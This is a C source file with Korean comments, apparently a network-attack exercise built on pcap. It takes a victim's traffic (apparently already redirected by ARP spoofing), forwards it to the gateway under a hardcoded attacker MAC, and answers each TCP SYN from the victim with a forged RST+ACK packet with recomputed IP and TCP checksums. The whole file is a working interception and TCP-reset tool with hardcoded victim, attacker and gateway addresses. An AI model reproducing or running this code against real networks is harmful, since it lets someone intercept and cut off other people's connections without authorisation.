#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <pcap.h>
#include <stdio.h>
#include <string.h>

#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN 4
#define BUF_SIZE 100
#define SNAPLEN 65536
#define ARP_HEADER_JMP 14
#define IP_HEADER_JMP 14
#define TCP_HEADER_JMP 20
#define DATA_JMP 20
#define CARRY 65536
#define TRUE 1
#define FALSE 0
pcap_t *use_dev;

//이더넷 헤더
#pragma pack(push, 1)
struct ethernet_header {
    unsigned char eth_dst_mac[MAC_ADDR_LEN];
    unsigned char eth_src_mac[MAC_ADDR_LEN];
    unsigned short eth_type;
};
#pragma pack(pop)

//IP 헤더
#pragma pack(push, 1)
struct ip_header {
    unsigned char ip_header_len : 4; //Header Length
    unsigned char ip_version : 4; // ipv4
    unsigned char ip_tos;//Type of Service
    unsigned short ip_total_len;//Total Length
    unsigned short ip_id;
    unsigned short flags;
    unsigned char ip_TTL;
    unsigned char ip_protocol;
    unsigned short ip_checksum;
    unsigned char ip_src_addr[IP_ADDR_LEN];
    unsigned char ip_dst_addr[IP_ADDR_LEN];
    //20 bytes
};
#pragma pack(pop)
//TCP 헤더
#pragma pack(push, 1)
struct tcp_header {
    unsigned short tcp_src_port;
    unsigned short tcp_dst_port;
    unsigned int seq_num;
    unsigned int ack_num;
    unsigned char ns : 1;
    unsigned char reserved_part1 : 3;
    unsigned char data_offset : 4;
    unsigned char fin : 1;
    unsigned char syn : 1;
    unsigned char rst : 1;
    unsigned char psh : 1;
    unsigned char ack : 1;
    unsigned char urg : 1;
    unsigned char ecn : 1;
    unsigned char cwr : 1;
    unsigned short window;
    unsigned short checksum;
    unsigned short urgent_pointer;
};
#pragma pack(pop)
#pragma pack(push, 1)
struct tcp_header_checksum {
    unsigned short tcp_src_port;
    unsigned short tcp_dst_port;
    unsigned int seq_num;
    unsigned int ack_num;
    unsigned short tcp_flags;
    unsigned short window;
    unsigned short checksum;
    unsigned short urgent_pointer;
};
#pragma pack(pop)

void ip_checksum(struct ip_header* _pIp);
void tcp_checksum(struct ip_header* _pIp, struct tcp_header_checksum* _pTcp);

//main 시작
int main(int argc, char **argv) {
    //네트워크 장치 불러옴
    pcap_if_t *alldevs = NULL;
    pcap_if_t *dev;
    struct ethernet_header *eh;
    struct tcp_header *th;
    struct ip_header *ih;
    //ip checksum을 계산하기 위한 buffer

    unsigned char ATTACK_MAC[MAC_ADDR_LEN] = { 0x00,0xe0,0x4c,0x61,0xc8,0x1f };
    unsigned char GATEWAY_MAC[MAC_ADDR_LEN] = { 0x88,0x36,0x6c,0x7a,0x56,0x40 };
    unsigned char ATTACK_IP[IP_ADDR_LEN] = { 192,168,42,18 };
    unsigned char VICTIM_MAC[MAC_ADDR_LEN] = { 0xb0,0x6e,0xbf,0xc6,0xfa,0x45 };


    char errbuf[BUF_SIZE];
    char FILTER_RULE[BUF_SIZE] = "arp";
    struct bpf_program rule_struct;
    int i, dev_num, res;
    struct pcap_pkthdr *header;
    const unsigned char *pkt_data;

    if (argv[1]) {
	strcpy(FILTER_RULE, "port ");
	strcat(FILTER_RULE, argv[1]);
    }

    if (pcap_findalldevs(&alldevs, errbuf) < 0) {
	printf("Device Find Error\n");
	return -1;
    }

    for (dev = alldevs, i = 0; dev != NULL; dev = dev->next) {
	printf("%d번 Device : %s (%s)\n", ++i, dev->name, dev->description);
    }
    printf("사용할 디바이스 번호 입력 : ");
    scanf("%d", &dev_num);

    for (dev = alldevs, i = 0; i < dev_num - 1; dev = dev->next, i++);

    if ((use_dev = pcap_open_live(dev->name, SNAPLEN, 1, 1000, errbuf)) == NULL) {
	printf("pcap_open ERROR!\n");
	pcap_freealldevs(alldevs);
	return -1;
    }
    printf("pcap_open 성공!\n");
    // pcap_open success!
//Packet Capture
    while (1) {
	//형변환
	res = pcap_next_ex(use_dev, &header, &pkt_data);
	if (res <= 0) continue;
	unsigned char temp[5000] = { 0 };
	eh = (struct ethernet_header *)pkt_data;
	int dp = sizeof(*eh);
	if (eh->eth_src_mac[0] == VICTIM_MAC[0]
	    && eh->eth_src_mac[1] == VICTIM_MAC[1]
	    && eh->eth_src_mac[2] == VICTIM_MAC[2]
	    && eh->eth_src_mac[3] == VICTIM_MAC[3]
	    && eh->eth_src_mac[4] == VICTIM_MAC[4]
	    && eh->eth_src_mac[5] == VICTIM_MAC[5])
	{
	    if (ntohs(eh->eth_type) == 0x0800) {
		ih = (struct ip_header *)(pkt_data + dp);
		dp += sizeof(*ih);
		if (ih->ip_dst_addr[0] != ATTACK_IP[0] ||
		    ih->ip_dst_addr[1] != ATTACK_IP[1] ||
		    ih->ip_dst_addr[2] != ATTACK_IP[2] ||
		    ih->ip_dst_addr[3] != ATTACK_IP[3])
		{
		    if (ih->ip_protocol == 0x06) {
			th = (struct tcp_header *)(pkt_data + dp);

			struct tcp_header_checksum* th_check;
			th_check = (struct tcp_header_checksum*)(pkt_data + dp);

			dp += sizeof(*th);
			if (th->syn == TRUE&&th->ack == FALSE) {
			    //backwarding
			//ethernet
			    memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));
			    memcpy(eh->eth_dst_mac, VICTIM_MAC, sizeof(eh->eth_dst_mac));
			    int b_dp = sizeof(*eh);
			    memcpy(temp, eh, sizeof(*eh));
			    //ip
			    unsigned char temp_ip[IP_ADDR_LEN];
			    memcpy(temp_ip, ih->ip_dst_addr, sizeof(ih->ip_dst_addr));
			    memcpy(ih->ip_dst_addr, ih->ip_src_addr, sizeof(ih->ip_src_addr));
			    memcpy(ih->ip_src_addr, temp_ip, sizeof(temp_ip));
			    ih->ip_total_len = htons(sizeof(*ih) + sizeof(*th_check));
			    ip_checksum(ih);
			    memcpy(temp + b_dp, ih, sizeof(*ih));
			    b_dp += sizeof(*ih);
			    printf("ip address changed \n");
			    //tcp
			    unsigned short tcp_temp_port;
			    tcp_temp_port = th_check->tcp_dst_port;
			    th_check->tcp_dst_port = th_check->tcp_src_port;
			    th_check->tcp_src_port = tcp_temp_port;
			    //tcp port 바뀜

			    th_check->ack_num = htonl(ntohl(th_check->seq_num) + 1);
			    th_check->seq_num = 0;
			    //flag
			    //th->syn = FALSE;
			    //th->rst = TRUE;
			    //th->ack = TRUE;
			    //th->cwr = FALSE;
			    //th->fin = FALSE;
			    //th->urg = FALSE;
			    //th->ecn = FALSE;
			    printf("flag = rst+ack \n");
			    th_check->tcp_flags = htons(0x5014);
			    //checksum
			    tcp_checksum(ih, th_check);
			    memcpy(temp + b_dp, th_check, sizeof(*th_check));
			    b_dp += sizeof(*th_check);
			    pcap_sendpacket(use_dev, temp, b_dp);
			    printf("packet sended!");
			}

		    }
		    else {
			//sizeof(eh->src_mac), sizeof(eh->dest_mac)값 을
			memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));
			memcpy(eh->eth_dst_mac, GATEWAY_MAC, sizeof(eh->eth_dst_mac));
			//sizeof(*eh)값 14로 값 넣어줌
			memcpy(temp, eh, sizeof(*eh));
			memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

			printf("forwarding\n");
			pcap_sendpacket(use_dev, temp, header->len);
		    }
		}
		else {
		    //sizeof(eh->src_mac), sizeof(eh->dest_mac)값 을
		    memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));
		    memcpy(eh->eth_dst_mac, GATEWAY_MAC, sizeof(eh->eth_dst_mac));
		    //sizeof(*eh)값 14로 값 넣어줌
		    memcpy(temp, eh, sizeof(*eh));
		    memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

		    printf("forwarding\n");
		    pcap_sendpacket(use_dev, temp, header->len);
		}
	    }
	    else {

		memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));
		memcpy(eh->eth_dst_mac, GATEWAY_MAC, sizeof(eh->eth_dst_mac));


		memcpy(temp, eh, sizeof(*eh));
		memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

		printf("forwarding\n");
		pcap_sendpacket(use_dev, temp, header->caplen);
	    }
	}
	
    }
    return 0;
}





//checksum 계산
void ip_checksum(struct ip_header* _pIp)
{
    unsigned short * pIps = (unsigned short*)_pIp;
    unsigned short len = (_pIp->ip_header_len) * 4, checksum;
    unsigned long check = 0;

    len >>= 1;
    _pIp->ip_checksum = 0;

    for (int i = 0; i < len; i++)
	check += *pIps++;

    check = (check >> 16) + (check & 0xffff);
    check += (check >> 16);

    checksum = (~check & 0xffff);

    _pIp->ip_checksum = checksum;
}

void tcp_checksum(struct ip_header* _pIp, struct tcp_header_checksum* _pTcp)
{
    unsigned short* pTcpH = (unsigned short*)_pTcp;
    unsigned short* tempIP;
    unsigned short dataLen = (ntohs(_pIp->ip_total_len)) - sizeof(struct ip_header);
    unsigned short nLen = dataLen;

    unsigned chksum = 0;

    unsigned short finalchk;

    nLen >>= 1;
    _pTcp->checksum = 0;

    for (int i = 0; i < nLen; i++)
    {
	chksum += *pTcpH++;
    }

    if (dataLen % 2 == 1)
    {
	chksum += *pTcpH++ & 0x00ff;
    }

    tempIP = (USHORT*)(&_pIp->ip_src_addr);
    for (int i = 0; i < 2; i++)
    {
	chksum += *tempIP++;
    }
    tempIP = (USHORT*)(&_pIp->ip_dst_addr);
    for (int i = 0; i < 2; i++)
    {
	chksum += *tempIP++;
    }

    chksum += htons(6);

    chksum += htons(dataLen);

    chksum = (chksum >> 16) + (chksum & 0xffff);
    chksum += (chksum >> 16);

    finalchk = (~chksum & 0xffff);

    _pTcp->checksum = finalchk;
}